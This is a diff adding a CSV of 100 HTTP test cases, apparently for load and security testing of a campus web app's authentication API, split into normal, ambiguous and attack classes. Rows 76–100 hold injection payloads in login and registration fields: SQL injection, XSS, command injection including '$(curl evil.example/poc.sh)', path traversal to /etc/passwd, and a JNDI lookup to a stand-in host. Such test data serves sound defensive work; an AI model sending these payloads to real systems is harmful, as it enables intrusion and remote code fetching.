@@ -1,0 +1,101 @@
+case_id,case_class,request_intent,http_method,request_path,content_type,request_body,auth_scope,capture_var,capture_expr,accepted_codes
+auth_001,normal,auth-register-session,POST,/api/auth/register,application/json,"{""email"":""jmx-auth-${__property(mixed500_run_id)}-01@campus.local"",""password"":""Password123!"",""name"":""auth-session-user"",""role"":""STUDENT""}",none,,,201|409
+auth_002,normal,auth-login-session,POST,/api/auth/login,application/json,"{""email"":""jmx-auth-${__property(mixed500_run_id)}-01@campus.local"",""password"":""Password123!""}",none,auth_dynamic_access_token,accessToken,200|401
+auth_003,normal,auth-me-session,GET,/api/auth/me,,,auth_dynamic,,,200|401
+auth_004,normal,auth-refresh-session,POST,/api/auth/refresh,application/json,,none,,,200|401
+auth_005,normal,auth-logout-session,POST,/api/auth/logout,application/json,,none,,,204
+auth_006,normal,auth-login-student1,POST,/api/auth/login,application/json,"{""email"":""student1@campus.local"",""password"":""Password123!""}",none,auth_dynamic_access_token,accessToken,200|401
+auth_007,normal,auth-me-student1,GET,/api/auth/me,,,auth_dynamic,,,200|401
+auth_008,normal,auth-refresh-student1,POST,/api/auth/refresh,application/json,,none,,,200|401
+auth_009,normal,auth-logout-student1,POST,/api/auth/logout,application/json,,none,,,204
+auth_010,normal,auth-login-admin1,POST,/api/auth/login,application/json,"{""email"":""admin1@campus.local"",""password"":""Password123!""}",none,,,200|401
+auth_011,normal,auth-register-normal,POST,/api/auth/register,application/json,"{""email"":""jmx-auth-normal-${__property(mixed500_run_id)}-11@campus.local"",""password"":""Password123!"",""name"":""정상회원-11"",""role"":""STUDENT""}",none,,,201|409
+auth_012,normal,auth-register-normal,POST,/api/auth/register,application/json,"{""email"":""jmx-auth-normal-${__property(mixed500_run_id)}-12@campus.local"",""password"":""Password123!"",""name"":""정상회원-12"",""role"":""STUDENT""}",none,,,201|409
+auth_013,normal,auth-register-normal,POST,/api/auth/register,application/json,"{""email"":""jmx-auth-normal-${__property(mixed500_run_id)}-13@campus.local"",""password"":""Password123!"",""name"":""정상회원-13"",""role"":""STUDENT""}",none,,,201|409
+auth_014,normal,auth-register-normal,POST,/api/auth/register,application/json,"{""email"":""jmx-auth-normal-${__property(mixed500_run_id)}-14@campus.local"",""password"":""Password123!"",""name"":""정상회원-14"",""role"":""STUDENT""}",none,,,201|409
+auth_015,normal,auth-register-normal,POST,/api/auth/register,application/json,"{""email"":""jmx-auth-normal-${__property(mixed500_run_id)}-15@campus.local"",""password"":""Password123!"",""name"":""정상회원-15"",""role"":""STUDENT""}",none,,,201|409
+auth_016,normal,auth-register-normal,POST,/api/auth/register,application/json,"{""email"":""jmx-auth-normal-${__property(mixed500_run_id)}-16@campus.local"",""password"":""Password123!"",""name"":""정상회원-16"",""role"":""STUDENT""}",none,,,201|409
+auth_017,normal,auth-register-normal,POST,/api/auth/register,application/json,"{""email"":""jmx-auth-normal-${__property(mixed500_run_id)}-17@campus.local"",""password"":""Password123!"",""name"":""정상회원-17"",""role"":""STUDENT""}",none,,,201|409
+auth_018,normal,auth-register-normal,POST,/api/auth/register,application/json,"{""email"":""jmx-auth-normal-${__property(mixed500_run_id)}-18@campus.local"",""password"":""Password123!"",""name"":""정상회원-18"",""role"":""STUDENT""}",none,,,201|409
+auth_019,normal,auth-register-normal,POST,/api/auth/register,application/json,"{""email"":""jmx-auth-normal-${__property(mixed500_run_id)}-19@campus.local"",""password"":""Password123!"",""name"":""정상회원-19"",""role"":""STUDENT""}",none,,,201|409
+auth_020,normal,auth-register-normal,POST,/api/auth/register,application/json,"{""email"":""jmx-auth-normal-${__property(mixed500_run_id)}-20@campus.local"",""password"":""Password123!"",""name"":""정상회원-20"",""role"":""STUDENT""}",none,,,201|409
+auth_021,normal,auth-register-normal,POST,/api/auth/register,application/json,"{""email"":""jmx-auth-normal-${__property(mixed500_run_id)}-21@campus.local"",""password"":""Password123!"",""name"":""정상회원-21"",""role"":""STUDENT""}",none,,,201|409
+auth_022,normal,auth-register-normal,POST,/api/auth/register,application/json,"{""email"":""jmx-auth-normal-${__property(mixed500_run_id)}-22@campus.local"",""password"":""Password123!"",""name"":""정상회원-22"",""role"":""STUDENT""}",none,,,201|409
+auth_023,normal,auth-register-normal,POST,/api/auth/register,application/json,"{""email"":""jmx-auth-normal-${__property(mixed500_run_id)}-23@campus.local"",""password"":""Password123!"",""name"":""정상회원-23"",""role"":""STUDENT""}",none,,,201|409
+auth_024,normal,auth-register-normal,POST,/api/auth/register,application/json,"{""email"":""jmx-auth-normal-${__property(mixed500_run_id)}-24@campus.local"",""password"":""Password123!"",""name"":""정상회원-24"",""role"":""STUDENT""}",none,,,201|409
+auth_025,normal,auth-register-normal,POST,/api/auth/register,application/json,"{""email"":""jmx-auth-normal-${__property(mixed500_run_id)}-25@campus.local"",""password"":""Password123!"",""name"":""정상회원-25"",""role"":""STUDENT""}",none,,,201|409
+auth_026,normal,auth-register-normal,POST,/api/auth/register,application/json,"{""email"":""jmx-auth-normal-${__property(mixed500_run_id)}-26@campus.local"",""password"":""Password123!"",""name"":""정상회원-26"",""role"":""STUDENT""}",none,,,201|409
+auth_027,normal,auth-register-normal,POST,/api/auth/register,application/json,"{""email"":""jmx-auth-normal-${__property(mixed500_run_id)}-27@campus.local"",""password"":""Password123!"",""name"":""정상회원-27"",""role"":""STUDENT""}",none,,,201|409
+auth_028,normal,auth-register-normal,POST,/api/auth/register,application/json,"{""email"":""jmx-auth-normal-${__property(mixed500_run_id)}-28@campus.local"",""password"":""Password123!"",""name"":""정상회원-28"",""role"":""STUDENT""}",none,,,201|409
+auth_029,normal,auth-register-normal,POST,/api/auth/register,application/json,"{""email"":""jmx-auth-normal-${__property(mixed500_run_id)}-29@campus.local"",""password"":""Password123!"",""name"":""정상회원-29"",""role"":""STUDENT""}",none,,,201|409
+auth_030,normal,auth-register-normal,POST,/api/auth/register,application/json,"{""email"":""jmx-auth-normal-${__property(mixed500_run_id)}-30@campus.local"",""password"":""Password123!"",""name"":""정상회원-30"",""role"":""STUDENT""}",none,,,201|409
+auth_031,normal,auth-login-normal,POST,/api/auth/login,application/json,"{""email"":""student1@campus.local"",""password"":""Password123!""}",none,,,200|401
+auth_032,normal,auth-login-normal,POST,/api/auth/login,application/json,"{""email"":""student2@campus.local"",""password"":""Password123!""}",none,,,200|401
+auth_033,normal,auth-login-normal,POST,/api/auth/login,application/json,"{""email"":""student11@campus.local"",""password"":""Password123!""}",none,,,200|401
+auth_034,normal,auth-login-normal,POST,/api/auth/login,application/json,"{""email"":""student12@campus.local"",""password"":""Password123!""}",none,,,200|401
+auth_035,normal,auth-login-normal,POST,/api/auth/login,application/json,"{""email"":""student13@campus.local"",""password"":""Password123!""}",none,,,200|401
+auth_036,normal,auth-login-normal,POST,/api/auth/login,application/json,"{""email"":""prof1@campus.local"",""password"":""Password123!""}",none,,,200|401
+auth_037,normal,auth-login-normal,POST,/api/auth/login,application/json,"{""email"":""admin1@campus.local"",""password"":""Password123!""}",none,,,200|401
+auth_038,normal,auth-login-normal,POST,/api/auth/login,application/json,"{""email"":""student14@campus.local"",""password"":""Password123!""}",none,,,200|401
+auth_039,normal,auth-login-normal,POST,/api/auth/login,application/json,"{""email"":""student15@campus.local"",""password"":""Password123!""}",none,,,200|401
+auth_040,normal,auth-login-normal,POST,/api/auth/login,application/json,"{""email"":""student1@campus.local"",""password"":""Password123!""}",none,,,200|401
+auth_041,normal,auth-login-normal,POST,/api/auth/login,application/json,"{""email"":""student11@campus.local"",""password"":""Password123!""}",none,,,200|401
+auth_042,normal,auth-login-normal,POST,/api/auth/login,application/json,"{""email"":""student12@campus.local"",""password"":""Password123!""}",none,,,200|401
+auth_043,normal,auth-login-normal,POST,/api/auth/login,application/json,"{""email"":""prof1@campus.local"",""password"":""Password123!""}",none,,,200|401
+auth_044,normal,auth-login-normal,POST,/api/auth/login,application/json,"{""email"":""admin1@campus.local"",""password"":""Password123!""}",none,,,200|401
+auth_045,normal,auth-login-normal,POST,/api/auth/login,application/json,"{""email"":""student2@campus.local"",""password"":""Password123!""}",none,,,200|401
+auth_046,normal,auth-login-normal,POST,/api/auth/login,application/json,"{""email"":""student13@campus.local"",""password"":""Password123!""}",none,,,200|401
+auth_047,normal,auth-login-normal,POST,/api/auth/login,application/json,"{""email"":""student14@campus.local"",""password"":""Password123!""}",none,,,200|401
+auth_048,normal,auth-login-normal,POST,/api/auth/login,application/json,"{""email"":""student15@campus.local"",""password"":""Password123!""}",none,,,200|401
+auth_049,normal,auth-login-normal,POST,/api/auth/login,application/json,"{""email"":""student1@campus.local"",""password"":""Password123!""}",none,,,200|401
+auth_050,normal,auth-login-normal,POST,/api/auth/login,application/json,"{""email"":""student11@campus.local"",""password"":""Password123!""}",none,,,200|401
+auth_051,ambiguous,auth-register-ambiguous,POST,/api/auth/register,application/json,"{""email"":""jmx-auth-ambiguous-${__property(mixed500_run_id)}-51@campus.local"",""password"":""Password123!"",""name"":""select 문 예시 회원"",""role"":""STUDENT""}",none,,,201|400|409
+auth_052,ambiguous,auth-register-ambiguous,POST,/api/auth/register,application/json,"{""email"":""jmx-auth-ambiguous-${__property(mixed500_run_id)}-52@campus.local"",""password"":""Password123!"",""name"":""script 태그 강의 회원"",""role"":""STUDENT""}",none,,,201|400|409
+auth_053,ambiguous,auth-register-ambiguous,POST,/api/auth/register,application/json,"{""email"":""jmx-auth-ambiguous-${__property(mixed500_run_id)}-53@campus.local"",""password"":""Password123!"",""name"":""query string 연구 회원"",""role"":""STUDENT""}",none,,,201|400|409
+auth_054,ambiguous,auth-register-ambiguous,POST,/api/auth/register,application/json,"{""email"":""jmx-auth-ambiguous-${__property(mixed500_run_id)}-54@campus.local"",""password"":""Password123!"",""name"":""보안 보고서 회원"",""role"":""STUDENT""}",none,,,201|400|409
+auth_055,ambiguous,auth-register-ambiguous,POST,/api/auth/register,application/json,"{""email"":""jmx-auth-ambiguous-${__property(mixed500_run_id)}-55@campus.local"",""password"":""Password123!"",""name"":""alert tcp 분석 회원"",""role"":""STUDENT""}",none,,,201|400|409
+auth_056,ambiguous,auth-register-ambiguous,POST,/api/auth/register,application/json,"{""email"":""jmx-auth-ambiguous-${__property(mixed500_run_id)}-56@campus.local"",""password"":""Password123!"",""name"":""cmd.exe 교육 회원"",""role"":""STUDENT""}",none,,,201|400|409
+auth_057,ambiguous,auth-register-ambiguous,POST,/api/auth/register,application/json,"{""email"":""jmx-auth-ambiguous-${__property(mixed500_run_id)}-57@campus.local"",""password"":""Password123!"",""name"":""powershell 설명 회원"",""role"":""STUDENT""}",none,,,201|400|409
+auth_058,ambiguous,auth-register-ambiguous,POST,/api/auth/register,application/json,"{""email"":""jmx-auth-ambiguous-${__property(mixed500_run_id)}-58@campus.local"",""password"":""Password123!"",""name"":""drop table 금지 회원"",""role"":""STUDENT""}",none,,,201|400|409
+auth_059,ambiguous,auth-register-ambiguous,POST,/api/auth/register,application/json,"{""email"":""jmx-auth-ambiguous-${__property(mixed500_run_id)}-59@campus.local"",""password"":""Password123!"",""name"":""sleep 함수 회원"",""role"":""STUDENT""}",none,,,201|400|409
+auth_060,ambiguous,auth-register-ambiguous,POST,/api/auth/register,application/json,"{""email"":""jmx-auth-ambiguous-${__property(mixed500_run_id)}-60@campus.local"",""password"":""Password123!"",""name"":""base64 우회 회원"",""role"":""STUDENT""}",none,,,201|400|409
+auth_061,ambiguous,auth-login-ambiguous,POST,/api/auth/login,application/json,"{""email"":""student1@campus.local"",""password"":""SelectGuide123!""}",none,,,200|400|401
+auth_062,ambiguous,auth-login-ambiguous,POST,/api/auth/login,application/json,"{""email"":""student2@campus.local"",""password"":""ScriptTag123!""}",none,,,200|400|401
+auth_063,ambiguous,auth-login-ambiguous,POST,/api/auth/login,application/json,"{""email"":""student11@campus.local"",""password"":""QueryString123!""}",none,,,200|400|401
+auth_064,ambiguous,auth-login-ambiguous,POST,/api/auth/login,application/json,"{""email"":""student12@campus.local"",""password"":""AlertTcp123!""}",none,,,200|400|401
+auth_065,ambiguous,auth-login-ambiguous,POST,/api/auth/login,application/json,"{""email"":""student13@campus.local"",""password"":""CmdExample123!""}",none,,,200|400|401
+auth_066,ambiguous,auth-login-ambiguous,POST,/api/auth/login,application/json,"{""email"":""prof1@campus.local"",""password"":""PowerShell123!""}",none,,,200|400|401
+auth_067,ambiguous,auth-login-ambiguous,POST,/api/auth/login,application/json,"{""email"":""admin1@campus.local"",""password"":""DropTable123!""}",none,,,200|400|401
+auth_068,ambiguous,auth-login-ambiguous,POST,/api/auth/login,application/json,"{""email"":""student14@campus.local"",""password"":""SleepGuide123!""}",none,,,200|400|401
+auth_069,ambiguous,auth-login-ambiguous,POST,/api/auth/login,application/json,"{""email"":""student15@campus.local"",""password"":""Base64Note123!""}",none,,,200|400|401
+auth_070,ambiguous,auth-login-ambiguous,POST,/api/auth/login,application/json,"{""email"":""student1@campus.local"",""password"":""Traversal123!""}",none,,,200|400|401
+auth_071,ambiguous,auth-register-duplicate,POST,/api/auth/register,application/json,"{""email"":""student1@campus.local"",""password"":""Password123!"",""name"":""student1"",""role"":""STUDENT""}",none,,,201|409
+auth_072,ambiguous,auth-register-duplicate,POST,/api/auth/register,application/json,"{""email"":""student2@campus.local"",""password"":""Password123!"",""name"":""student2"",""role"":""STUDENT""}",none,,,201|409
+auth_073,ambiguous,auth-register-duplicate,POST,/api/auth/register,application/json,"{""email"":""student11@campus.local"",""password"":""Password123!"",""name"":""김민지"",""role"":""STUDENT""}",none,,,201|409
+auth_074,ambiguous,auth-register-duplicate,POST,/api/auth/register,application/json,"{""email"":""student12@campus.local"",""password"":""Password123!"",""name"":""강해린"",""role"":""STUDENT""}",none,,,201|409
+auth_075,ambiguous,auth-register-duplicate,POST,/api/auth/register,application/json,"{""email"":""student13@campus.local"",""password"":""Password123!"",""name"":""장원영"",""role"":""STUDENT""}",none,,,201|409
+auth_076,attack,auth-login-attack,POST,/api/auth/login,application/json,"{""email"":""student1@campus.local"",""password"":""' OR '1'='1""}",none,,,200|400|401
+auth_077,attack,auth-login-attack,POST,/api/auth/login,application/json,"{""email"":""student1@campus.local"",""password"":""<script>alert(1)</script>""}",none,,,200|400|401
+auth_078,attack,auth-login-attack,POST,/api/auth/login,application/json,"{""email"":""student1@campus.local"",""password"":"";whoami""}",none,,,200|400|401
+auth_079,attack,auth-login-attack,POST,/api/auth/login,application/json,"{""email"":""student1@campus.local"",""password"":""../etc/passwd""}",none,,,200|400|401
+auth_080,attack,auth-login-attack,POST,/api/auth/login,application/json,"{""email"":""student1@campus.local"",""password"":""${jndi:ldap://evil.example/a}""}",none,,,200|400|401
+auth_081,attack,auth-login-attack,POST,/api/auth/login,application/json,"{""email"":""student1@campus.local"",""password"":""cmd.exe /c whoami""}",none,,,200|400|401
+auth_082,attack,auth-login-attack,POST,/api/auth/login,application/json,"{""email"":""student1@campus.local"",""password"":""powershell -enc ZQB2AGkAbAA=""}",none,,,200|400|401
+auth_083,attack,auth-login-attack,POST,/api/auth/login,application/json,"{""email"":""student1@campus.local"",""password"":""waitfor delay '0:0:5'--""}",none,,,200|400|401
+auth_084,attack,auth-login-attack,POST,/api/auth/login,application/json,"{""email"":""student1@campus.local"",""password"":""union select password from users--""}",none,,,200|400|401
+auth_085,attack,auth-login-attack,POST,/api/auth/login,application/json,"{""email"":""student1@campus.local"",""password"":""`id`""}",none,,,200|400|401
+auth_086,attack,auth-login-attack,POST,/api/auth/login,application/json,"{""email"":""student1@campus.local"",""password"":""$(curl evil.example/poc.sh)""}",none,,,200|400|401
+auth_087,attack,auth-login-attack,POST,/api/auth/login,application/json,"{""email"":""student1@campus.local"",""password"":""benchmark(1000000,md5(1))""}",none,,,200|400|401
+auth_088,attack,auth-login-attack,POST,/api/auth/login,application/json,"{""email"":""student1@campus.local"",""password"":""../admin""}",none,,,200|400|401
+auth_089,attack,auth-login-attack,POST,/api/auth/login,application/json,"{""email"":""student1@campus.local"",""password"":""<img src=x onerror=alert(1)>""}",none,,,200|400|401
+auth_090,attack,auth-login-attack,POST,/api/auth/login,application/json,"{""email"":""student1@campus.local"",""password"":""admin'--""}",none,,,200|400|401
+auth_091,attack,auth-register-attack,POST,/api/auth/register,application/json,"{""email"":""jmx-auth-attack-${__property(mixed500_run_id)}-91@campus.local"",""password"":""Password123!"",""name"":""<script>alert(1)</script> 회원"",""role"":""STUDENT""}",none,,,201|400|409
+auth_092,attack,auth-register-attack,POST,/api/auth/register,application/json,"{""email"":""jmx-auth-attack-${__property(mixed500_run_id)}-92@campus.local"",""password"":""Password123!"",""name"":""cmd.exe 예시 회원"",""role"":""STUDENT""}",none,,,201|400|409
+auth_093,attack,auth-register-attack,POST,/api/auth/register,application/json,"{""email"":""jmx-auth-attack-${__property(mixed500_run_id)}-93@campus.local"",""password"":""Password123!"",""name"":""powershell -enc 회원"",""role"":""STUDENT""}",none,,,201|400|409
+auth_094,attack,auth-register-attack,POST,/api/auth/register,application/json,"{""email"":""jmx-auth-attack-${__property(mixed500_run_id)}-94@campus.local"",""password"":""Password123!"",""name"":""../admin 경로 회원"",""role"":""STUDENT""}",none,,,201|400|409
+auth_095,attack,auth-register-attack,POST,/api/auth/register,application/json,"{""email"":""jmx-auth-attack-${__property(mixed500_run_id)}-95@campus.local"",""password"":""Password123!"",""name"":"";whoami 회원"",""role"":""STUDENT""}",none,,,201|400|409
+auth_096,attack,auth-register-attack,POST,/api/auth/register,application/json,"{""email"":""jmx-auth-attack-${__property(mixed500_run_id)}-96@campus.local"",""password"":""Password123!"",""name"":""${jndi:ldap://evil.example/a} 회원"",""role"":""STUDENT""}",none,,,201|400|409
+auth_097,attack,auth-register-attack,POST,/api/auth/register,application/json,"{""email"":""jmx-auth-attack-${__property(mixed500_run_id)}-97@campus.local"",""password"":""Password123!"",""name"":""drop table 회원"",""role"":""STUDENT""}",none,,,201|400|409
+auth_098,attack,auth-register-attack,POST,/api/auth/register,application/json,"{""email"":""jmx-auth-attack-${__property(mixed500_run_id)}-98@campus.local"",""password"":""Password123!"",""name"":""sleep(5) 회원"",""role"":""STUDENT""}",none,,,201|400|409
+auth_099,attack,auth-register-attack,POST,/api/auth/register,application/json,"{""email"":""jmx-auth-attack-${__property(mixed500_run_id)}-99@campus.local"",""password"":""Password123!"",""name"":""alert tcp 룰 회원"",""role"":""STUDENT""}",none,,,201|400|409
+auth_100,attack,auth-register-attack,POST,/api/auth/register,application/json,"{""email"":""jmx-auth-attack-${__property(mixed500_run_id)}-100@campus.local"",""password"":""Password123!"",""name"":""<img onerror> 회원"",""role"":""STUDENT""}",none,,,201|400|409
